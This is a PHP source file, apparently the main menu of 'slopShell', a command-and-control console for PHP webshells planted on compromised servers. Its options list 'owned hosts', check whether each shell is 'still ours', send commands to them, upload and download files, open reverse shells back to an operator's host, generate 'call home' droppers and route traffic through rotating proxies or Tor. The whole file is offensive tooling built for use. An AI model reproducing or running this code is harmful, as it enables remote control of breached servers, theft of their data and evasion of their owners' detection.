<?php

use menu_items\logo;

require "generic_constants.php";
require "includes/droppers/dynamic_generator.php";
require "includes/bot_c2/menu_items/logo.php";
$a = new generic_constants();
$a->runn();

$supply_template = [
    "last" => NULL,
    "cl" => clears,
    "error" => NULL,
    "error_value" => NULL,
    "previous_host" => NULL
                ];
$proxy_set = null;
$proxy_target = null;
$proxy_schema = null;
const lo = new logo();

const response_array = array(
    "default" => PHP_EOL . "\e[1;33m%s%s Hmm. A status other than what i was looking for was returned, please manually confirm the shell was uploaded.\e[0m" . PHP_EOL,
    "200" => PHP_EOL . "\e[0;32m%s%s is still ours!\e[0m" . PHP_EOL,
    "404" => PHP_EOL . "\e[0;31m%s%s Looks like our shell was caught... sorry..\e[0m" . PHP_EOL,
    "500" => PHP_EOL . "\e[1;31m%s%s Your useragent was not the correct one... did you forget??\e[0m" . PHP_EOL
);

function initDatabase(array $data){
    if (is_null(getenv('FIRST_RUN'))) {
        switch (SQL_SELECTION) {
            case str_contains(SQL_SELECTION, "pgsql"):
                define("db_call", new postgres_pdo("pgsql:host=localhost;dbname=postgres", "postgres", "", array(
                    PDO::ATTR_PERSISTENT => true
                ))); //Change these values as needed.
                db_call->firstRun();
                break;
            case str_contains(SQL_SELECTION, "sqlite3"):
            default:
                define("db_call", new slopSqlite("includes/db/sqlite3_repo/slopSqlite.sqlite3", SQLITE3_OPEN_READWRITE | SQLITE3_OPEN_CREATE, ""));
                break;
        }
        putenv("FIRST_RUN=1");
    }
}

//function grabData(array $data): array{
//    switch ($data['local']){
//        case str_contains($data['local'], "pull"):
//            return [
//                "Success" => true,
//                "data" => [
//                    db_call->grabAndFormatOutput($data)
//                ]
//            ];
//        default:
//            db_call->insertData($data);
//            return [
//                "Success" => true,
//                "data" => [
//
//                ]
//            ];
//    }
//}

function grab_proxy(string $action, string $target_domain, bool $randomize){
    if ($action === "test" && !empty($target_domain)){
        foreach (db_call->grabAndFormatOutput(['call' => 'multi','type'=> "proxy"]) as $row){
            print($row);
        }
    }else{
        lo->display_logo(
            [
                "cl" => clears,
                "last" => "proxy",
                "error" => true,
                "error_value" => "The Required information was empty.".PHP_EOL,
                "previous_host" => $target_domain
            ]
        );
    }
}

function update_proxy_db_entries(string $proxy, bool $succssful, string $last_contact, bool $time_out, int $round_trip_time)
{
    if (!is_null($proxy) && !is_null($succssful) && !is_null($last_contact) && $proxy !== 'none') {
        #@TODO fix this.
        $tg = sprintf("SELECT times_used,time_outs,successful_responses FROM sloppy_bots_proxies WHERE proxy = '%s'", $proxy);
        $tc = pg_exec(pg_connect(DBCONN),
            sprintf("UPDATE sloppy_bots_proxies SET times_used = '%s', last_domain_contacted = '%s', round_trip_time = '%s', time_outs = '%s', successful_responses = '%s'  WHERE proxy = '%s'",
                (int)$tg[0] + 1,
                $last_contact,
                $round_trip_time ? $round_trip_time : 0,
                $time_out ? (int)$tg[1] + 1 : (int)$tg[1] - 1,
                $succssful ? (int)$tg[2] + 1 : (int)$tg[2] - 1,
                $proxy
            ));
    } else {
        return 0;
    }
}

function aHo($host, $os, $checkIn)
{
    if (!empty($host)) {
        $path = parse_url($host);
        if (db_call->insertData([ "action" => "add_bot",
                "rhost" => sprintf("%s:%s", $path['host'], $path['port']),
                "uri" => $path['uri'], "uuid" => '', "os_flavor" => $os, "check_in" => $checkIn]) != 0) {
            if (strpos($path['path'], 'txt'))
            {
                lo->display_logo(
                    [
                        "last" => "add host/shell",
                        'cl' => clears,
                        "error" => true,
                        "error_value" => "Extension cannot end in anything other than php, as this is a php webshell.",
                        "previous_host" => sprintf("%s%s:%s", $path['host'], $path['port'], $path['path'])
                    ]
                );
            }
            lo->display_logo([
                "last" => "add host/shell",
                "cl" => clears,
                "error" => false,
                "error_value" => NULL,
                "previous_host" => sprintf('%s', $path['host'].$path['port'].":".$path['path'])
                ]
            );
            echo "\n\nSuccessfully added: $host";
        } else {
            $supply_template['last'] = "add host";
            $supply_template['error'] = true;
            $supply_template['error_value'] = "Duplicate Host";
            $supply_template['previous_host'] = sprintf('%s', $host);
            lo->display_logo($supply_template);
            echo "\n\nSeems as though the information supplied, was bad..\nOr the host already is in the DB.";
        }
    } else {
        $supply_template['last'] = "add host";
        $supply_template['error'] = NULL;
        $supply_template['previous_host'] = sprintf("%s", $host);
        lo->display_logo($supply_template);
    }
}

function awesomeMenu(string $what)
{
    // this is quite messy, but will be refined later. it's just in here for now.
    system(clears);
    switch ($what){
        case "hosts":
            echo str_repeat("+", 35) . "[ OWNED HOSTS ]" . str_repeat("+", 35) . "\n\n";
            foreach (db_call->grabAndFormatOutput(["type" => "bots"])as $tem => $use) {
                print(sprintf("[ ID: ]-> %s [ RHOST: ]-> %s [ URI: ]-> %s [ OS_FLAVOR: ]-> %s [ CHECKED_IN: ]-> %s\n",
                    $use['id'],
                    $use['rhost'],
                    $use['uri'],
                    $use['os_flavor'],
                    $use['check_in']
                ));
            }
            echo "\n\n" . str_repeat("+", 35) . "[ END OWNED HOSTS ]" . str_repeat("+", 35) . "\n\n";
            break;
        case "proxies":
            $schema = trim(readline('[ !! ] Which schema?(socks4/socks5/http)->'));
            db_call->grabAndFormatOutput(['type' => 'proxy', 'schema' => $schema, 'limit' => "10"]);
            echo str_repeat("+", 35) . "[ PROXIES ]" . str_repeat("+", 39) . "\n\n";
            foreach (db_call->grabAndFormatOutput(['type' => 'proxy']) as $tem => $use) {
                print(sprintf("[ ID: ]-> %s [ SCHEMA: ]-> %s [ PROXY: ]-> %s [ HOW MANY TIMES WE USED: ]-> %s [ LAST CONTACTED DOMAIN: ]-> %s\n",
                    $use['id'],
                    $use['proxy_schema'],
                    $use['proxy'],
                    $use['times_used'],
                    $use['last_domain_contacted']
                ));
            }
            echo "\n\n" . str_repeat("+", 35) . "[ END PROXIES ]" . str_repeat("+", 35) . "\n\n";
            return array(
                "Proxy" => db_call->grabAndFormatOutput(['type' => 'proxy_assign', 'proxy_id' => trim(readline("Please give me the id of the proxy you would like to use."))]),
                "Schema" => $schema
            );
        default:
            echo str_repeat("+", 35) . "[ Droppers ]" . str_repeat("+", 39) . "\n\n";
            foreach (db_call->grabAndFormatOutput(['type' => 'dropper']) as $tem => $use) {
                print(sprintf("[ ID: ]-> %s [ Stored: ]-> %s [ CallerDomain: ]-> %s [ Cookie Name: ]-> %s [ Cookie Value: ]-> %s [ User Agent ] -> %s\n",
                    $use['id'],
                    $use['location_on_disk'],
                    $use['caller_domain'],
                    $use['cookiename'],
                    $use['cookievalue'],
                    $use['user_agent']
                ));
            }
            echo "\n\n" . str_repeat("+", 35) . "[ END Droppers ]" . str_repeat("+", 35) . "\n\n";
            break;
    }

}

function check($host, $path, $batch, $proxy)
{
    if (is_null($proxy)){
        $proxy = 'none';
    }
    if ($batch === "y") {
        // 'ch',clears,false, '','batch request'
        $supply_template['last'] = 'check';
        $supply_template['error'] = 'false';
        $supply_template['previous_host'] = 'batch request';
        lo->display_logo($supply_template);
        $checker = db_call->grabAndFormatOutput(['type' => 'bots']);
        echo "Pulling: " . $checker['count'] . "\nThis could take awhile.";
        curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
        foreach ($checker['bots'] as $r) {
            echo "\nTrying: {$r['rhost']}{$r['uri']}\n";
            curl_setopt(CHH, CURLOPT_URL, $r['rhost'] . $r['uri'] . "?qs=cqS");
            curl_exec(CHH);
            switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                    case 200:
                        print(sprintf(response_array['200'], $r['rhost'],$r['uri']));
                        pg_exec(pg_connect(DBCONN), sprintf("UPDATE sloppy_bots_main SET check_in = '%s' WHERE rhost = '%s'",  (int)$r['check_in'] + 1,$r['rhost']));
                        update_proxy_db_entries($proxy, true, $r['rhost'], false, curl_getinfo(CHH, CURLINFO_TOTAL_TIME_T));
                        break;
                    case 404:
                        print(sprintf(response_array['404'], $r['rhost'],$r['uri']));
                        update_proxy_db_entries($proxy, true, $r['rhost'], false, curl_getinfo(CHH, CURLINFO_TOTAL_TIME_T));
                        break;
                    case 500:
                        print(sprintf(response_array['500'], $r['rhost'],$r['uri']));
                        update_proxy_db_entries($proxy, true, $r['rhost'], false, curl_getinfo(CHH, CURLINFO_TOTAL_TIME_T));
                        break;
                    default:
                        print(sprintf(response_array['default'], $r['rhost'],$r['uri']));
                        $teaTime = curl_getinfo(CHH);
                        update_proxy_db_entries($proxy, false, $r['rhost'], false, curl_getinfo(CHH, CURLINFO_TOTAL_TIME_T));
                        break;
                    }
        }
    } elseif ($batch === "n") {
        if (!empty($host) && !empty($path)) {
            $bot = db_call->grabAndFormatOutput(['type' => 'single_bot', 'bot' => trim(readline("Please give me the botid"))]);
            curl_setopt(CHH, CURLOPT_URL, $bot['rhost'].$bot['uri'] . "?qs=cqS");
            curl_setopt(CHH, CURLOPT_TIMEOUT, 5);
            curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 5);
            curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
            curl_exec(CHH);
            if (!curl_errno(CHH)) {
                switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                    case 200:
                        logo('check',clears,false, '', sprintf('%s', $bot['rhost'].$bot['uri']));
                        print(sprintf(response_array['200'], $bot['rhost'].$bot['uri']));
                        update_proxy_db_entries($proxy, true, $bot['rhost'].$bot['uri'], false, curl_getinfo(CHH, CURLINFO_TOTAL_TIME_T));
                        break;
                    case 404:
                        logo('check',clears,true, 'Shell not found.', sprintf('%s', $bot['rhost'].$bot['uri']));
                        print(sprintf(response_array['404'], $bot['rhost'].$bot['uri']));
                        update_proxy_db_entries($proxy, true, $bot['rhost'].$bot['uri'], false, curl_getinfo(CHH, CURLINFO_TOTAL_TIME_T));
                        break;
                    case 500:
                        logo('check',clears,true, 'Bad User Agent', sprintf('%s', $bot['rhost'].$bot['uri']));
                        print(sprintf(response_array['500'], $bot['rhost'].$bot['uri']));
                        update_proxy_db_entries($proxy, true, $bot['rhost'].$bot['uri'], false, curl_getinfo(CHH, CURLINFO_TOTAL_TIME_T));
                        break;
                    default:
                        logo('check',clears,true, 'Server still running??', sprintf('%s', $bot['rhost'].$bot['uri']));
                        print(sprintf(response_array['default'], $bot['rhost'].$bot['uri']));
                        update_proxy_db_entries($proxy, true, $bot['rhost'].$bot['uri'], false, curl_getinfo(CHH, CURLINFO_TOTAL_TIME_T));
                        break;
                }
            }else{
                update_proxy_db_entries($proxy, false, $bot['rhost'].$bot['uri'], true, curl_getinfo(CHH, CURLINFO_TOTAL_TIME_T));
            }
        }
    } else {
        logo("cr", "", true, "", $host);
    }
}

$run = true;
echo "[ ++ ] Checking for updates [ ++ ]".PHP_EOL;
if (str_contains(getcwd(), "slopShell")) {
    system("git checkout master && git pull");
} else {
    $homie = readline("Where is slopshell downloaded to?(full path)->");
    system("git pull {$homie}");
}
$proxy_set = null;
$proxy_target = null;
$curlopt_proxy_types = array(
    "http" => CURLPROXY_HTTP,
    "https" => CURLPROXY_HTTPS,
    "socks4" => CURLPROXY_SOCKS4,
    "socks5" => CURLPROXY_SOCKS5,
    "tor" => CURLPROXY_SOCKS4
);


switch (strtolower(readline("Would you like to configure the proxies?(y/n/tor)"))){
    case "y":
        $cho = awesomeMenu('proxies');
        $proxy_set = true;
        $proxy_target = $cho['Proxy'][0];
        $proxy_schema = $curlopt_proxy_types[$cho['Schema']];
        break;
    case "n":
        $proxy_set = false;
        $proxy_schema = null;
        $proxy_target = null;
        break;
    default:
        $proxy_set = true;
        $proxy_target = "127.0.0.1:9050";
        $proxy_schema = $curlopt_proxy_types['tor'];
        break;
}
if (is_null(config['sloppy_proxies']['rotate']) && $proxy_set){
    switch (strtolower(readline("Would you like to rotate proxies?(y/n)-> "))){
        case "y":
            $rotate_proxy = true;
            break;
        case "n":
            $rotate_proxy = false;
            break;
    }
}

while ($run) {
    lo->display_logo($supply_template);
    $h = null;
    $p = null;
    $m = null;
    $c = null;
    $e = null;
    $w = null;
    $pw = null;
    curl_reset(CHH);
    curl_setopt(CHH, CURLOPT_HEADER, 1);
    try {
        if ($proxy_set === false) {
            echo "\e[0;31;40mPROXY NOT SET.\e[0m".PHP_EOL;
            curl_setopt(CHH, CURLOPT_USERAGENT, config['sloppy_http']['useragent']);
            curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
            curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
        } else {
            echo "\e[0;32;40mProxy pointing to: " . $proxy_schema ."\e[0m".PHP_EOL;
            curl_setopt(CHH, CURLOPT_USERAGENT, config['sloppy_http']['useragent']);
            if (!is_null($proxy_target)){
                echo "\e[0;32;40mProxy Set: " . $proxy_target ."\e[0m".PHP_EOL;
                if (strpos($proxy_schema, "http")) {
                    curl_setopt(CHH, CURLOPT_HTTPPROXYTUNNEL, 1);
                }else{
                    curl_setopt(CHH, CURLOPT_HTTPPROXYTUNNEL, 0);
                }
                curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 30);
                curl_setopt(CHH, CURLOPT_TIMEOUT, 30);
                curl_setopt(CHH, CURLOPT_PROXYTYPE, $proxy_schema);
                curl_setopt(CHH, CURLOPT_PROXY, $proxy_target);
            }
        }
        if (config['sloppy_http']['verify_ssl'] === "no") {
            curl_setopt(CHH, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt(CHH, CURLOPT_SSL_VERIFYPEER, 0);
        } else {
            curl_setopt(CHH, CURLOPT_SSL_VERIFYHOST, 2);
            curl_setopt(CHH, CURLOPT_SSL_VERIFYPEER, 2);
        }
    } catch (Exception $e) {
        print("{$e}\n\n");
    }
    echo "Current User-Agent: ". config['sloppy_http']['useragent'].PHP_EOL;
    print("\n\033[33;40mPlease select your choice:".PHP_EOL."->");
    echo("\033[0m");
    $pw = trim(fgets(STDIN));
    $lc = $pw;
//    logo($lc, clears, "", "", '');
    $supply_template['last'] = $lc;
    lo->display_logo($supply_template);
    switch (strtolower($pw)) {
        case "r":
            switch (strtolower(readline("Would you like to configure the proxies?(y/n/tor)"))){
                case "y":
                    $cho = awesomeMenu('proxies');
                    $proxy_set = true;
                    $proxy_target = $cho['Proxy'][0];
                    $proxy_schema = $curlopt_proxy_types[$cho['Schema']];
                    break;
                case "n":
                    $proxy_set = false;
                    $proxy_schema = null;
                    $proxy_target = null;
                    break;
                case "tor":
                    $proxy_set = true;
                    $proxy_target = "127.0.0.1:9050";
                    $proxy_schema = $curlopt_proxy_types['tor'];
                    break;
            }
            break;
        case "lt":
            $what_we_want = readline("[ ?? ] What are we looking for? (t/d/dr/proxy)->");
            switch ($what_we_want){
                case "t":
                    awesomeMenu("tools");
                    break;
                case "d":
                    awesomeMenu("domains");
                    break;
                case "dr":
                    awesomeMenu("droppers");
                    break;
                case "proxy":
                    awesomeMenu("proxies");
                    break;
            }
            break;
        case "at":
            $add = trim(readline("Do we need to add it to the db? (add/grab) -> "));
            if ($add === "add") {
                $ourTool = trim(readline("Full path to tool-> "));
                $dcrypt = trim(readline("Do we need to encrypt it?-> "));
                if ($dcrypt === 'n') {
                    $encrypt = false;
                } else {
                    $encrypt = true;
                }
                $name = trim(readline("Is there a name for it already, or what do you call it.? ->"));
                sloppyTools($add, $ourTool, $name, $encrypt);
            } else {
                sloppyTools($add, '', '', '');
            }
            break;
        case "up":
            $u = readline("[ !! ] Are we uploading or downloading?".PHP_EOL."(u/d)->");
            awesomeMenu("hosts");
            $t = readline("->");
            if (strtolower($u) === "d") {
                b64(array('read' => trim(readline("Which file are we trying to download?(full path please)-> "))), "D", $t);
            }else{
                $x = awesomeMenu("tools");
                b64($x, "u", $t);
            }
            break;
        case "cr":
            system(clears);
            $h_name = null;
            $h_port = null;
            $d_int = null;
            $osb = null;
            echo("Where are we calling home to? [(http/https)://hostname|ip:port/diag_handler.php]->");
            $h_name = trim(fgets(STDIN));
            createDropper($h_name);
            break;
        case "sys":
            system(clears);
            awesomeMenu("hosts");
            $h = readline("Which host are we checking?".PHP_EOL."->");
            try {
                sys($h);
            } catch (Exception $e) {
                $supply_template['last'] = 's';
                $supply_template['error'] = true;
                $supply_template['error_value'] = $e;
                $supply_template['previous_host'] = $h;
                lo->display_logo($supply_template);
            }
            break;
        case "rev":
            system(clears);
            awesomeMenu("hosts");
            $h = readline("Please tell me the host.(default is the host sending this request.)".PHP_EOL."->");
            $p = readline(PHP_EOL."Which port shall we use?(default is 1634)".PHP_EOL."->");
            $m = readline("Which method is to be used?(default is bash)".PHP_EOL."->");
            $w = readline("Who are we connecting back to?".PHP_EOL."(our ip/hostname)->");
            if (!empty($h)) {
                rev($h, $p, $m, $w);
            }
            break;
        case "com":
            system(clears);
            try {
                awesomeMenu("hosts");
                $h = readline("Which host are we sending the command to?".PHP_EOL."->");
                $c = readline("And now the command: ".PHP_EOL."->");
                $e = readline("Are we needing to encrypt?".PHP_EOL."(y/n)->");
                switch (strtolower($e)) {
                    case "y":
                        $encrypt = true;
                        break;
                    default:
                        $encrypt = false;
                        break;
                }
                co($c, $h, $encrypt); // defaulting to false for now. until all apsects of that call are worked out and added to the shell.
            } catch (Exception $e) {
                $supply_template['last'] = 'cl';
                $supply_template['error'] = true;
                $supply_template['error_value'] = $e;
                $supply_template['previous_host'] = $h;
                lo->display_logo($supply_template);
            }
            break;
        case "cl":
            system(clears);
            try {
                awesomeMenu("hosts");
                $h = readline("Which host are we interacting with?".PHP_EOL."->");
                $rep = readline("Repo to clone?".PHP_EOL."->");
                clo($h, $rep, queryDB($h, "cl"));
            } catch (Exception $e) {
                $supply_template['last'] = 'cl';
                $supply_template['error'] = true;
                $supply_template['error_value'] = $e;
                $supply_template['previous_host'] = $h;
                lo->display_logo($supply_template);
            }
            break;
        case "a":
            system(clears);
            try {
                $h = readline("Who did we pwn my friend?".PHP_EOL."->");
                $o = readline("Do you know the OS?".PHP_EOL."->");
                aHo($h, $o, 0);
            } catch (Exception $e) {
                $supply_template['error'] = true;
                $supply_template['error_value'] = $e;
                $supply_template['previous_host'] = $h;
                lo->display_logo($supply_template);
            }
            break;
        case "ch":
            system(clears);
            try {
                $b = strtolower(readline("Is this going to be a batch job?(Y/N)".PHP_EOL."->"));
                switch ($b) {
                    case "y":
                        echo "Executing batch job!".PHP_EOL;
                        check('0', 'b', "y", $proxy_target);
                        break;
                    case "n":
                        echo "Not executing batch job.".PHP_EOL;
                        awesomeMenu("hosts");
                        $h = readline("Who is it we need to check on?(based on ID)".PHP_EOL."->");
                        check($h, "chR", "n", $proxy_target);
                        break;
                    default:
                        //'ch', clears, true, "Your host was empty, sorry but I will return you to the previous menu.".PHP_EOL, ''
                        $supply_template['last'] = 'ch';
                        $supply_template['error'] = true;
                        $supply_template['error_value'] = "Your Host was empty, sorry but i will return you to the previous menu.";
                        lo->display_logo($supply_template);
                        break;
                }
            } catch (Exception $e) {
                $supply_template['last'] = 'ch';
                $supply_template['error'] = true;
                $supply_template['error_value'] = $e;
                lo->display_logo($supply_template);
            }
            break;
        case "m":
            $supply_template['last'] = "m";
            lo->display_logo($supply_template);
            break;
        case "q":
            curl_close(CHH);
            $supply_template['last'] = 'q';
            lo->display_logo($supply_template);
            $run = false;
            break;
        case "o":
            lo->opts($proxy_set);
            break;
        case "gp":
            $p_judge = trim(readline('Proxy judge?(schema://domain:port/ or blank for none.)-> '));
            grab_proxy(readline("What are we doing?(test/confirm)->"), empty($p_judge) ? "https://icanhazip.com" : $p_judge, is_null($rotate_proxy) ? false : $rotate_proxy);
            break;
        case 'gc':
            $t = new dynamic_generator();
            $t->genCert((int)trim(readline("Cert Strength please.")), "RSA", '', '', array(
                "countryName" => "Uk"
            ));
            break;
        default:
            $supply_template['last'] = $lc;
            lo->display_logo($supply_template);
            echo "\033[33;40myou need to select a valid option...\033[0m".PHP_EOL;
    }
}

